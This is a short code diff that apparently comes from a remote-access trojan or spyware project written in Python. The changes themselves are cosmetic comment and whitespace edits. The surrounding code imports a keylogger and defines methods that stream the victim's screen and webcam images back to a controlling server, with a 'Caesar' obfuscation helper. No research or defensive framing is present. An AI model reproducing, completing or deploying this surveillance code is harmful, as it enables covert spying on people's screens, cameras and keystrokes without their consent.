@@ -16,6 +16,7 @@ from Crypto.Hash import SHA256
 from keylogger import Keylogger
 
 
+
 class GeneralFeatures:
 
         def __init__(self):
@@ -125,7 +126,7 @@ class GeneralFeatures:
                 pass
 
 
-        #sends live feed of screen recording back to server
+        # sends live feed of screen recording back to server
         def live_screen_feed(self, conn):
             conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             img_counter = 0
@@ -178,7 +179,7 @@ class GeneralFeatures:
 
 
 
-        #sends camshot from webcam back to server
+        # sends camshot from webcam back to server
         def webcam_capture(self, conn):
             conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
